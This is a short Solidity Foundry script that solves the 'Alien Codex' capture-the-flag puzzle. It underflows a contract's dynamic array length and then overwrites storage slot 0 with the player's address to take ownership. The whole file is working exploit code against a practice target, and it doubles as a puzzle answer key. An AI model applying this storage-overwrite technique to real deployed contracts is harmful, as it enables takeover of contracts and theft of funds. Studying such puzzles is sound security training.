// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {IAlienCodex} from "@puzzles/19/IAlienCodex.sol";

contract AlienCodexSolution is Script {
    function run(address target) public {
        solve(target, msg.sender);
    }

    function solve(address target, address player) public {
        IAlienCodex puzzleContract = IAlienCodex(target);
        bytes32 slot = keccak256(abi.encode(1)); // alienCodex.codex[0];
        uint256 hackSlot = type(uint256).max - uint256(slot) + 1;
        bytes32 overrideValue = bytes32(abi.encodePacked(bytes12(uint96(1)), bytes20(player)));

        vm.startBroadcast();
        puzzleContract.makeContact();
        puzzleContract.retract(); // make codex.length overflow to type.max(uint256)
        puzzleContract.revise(hackSlot, overrideValue);
        vm.stopBroadcast();
    }
}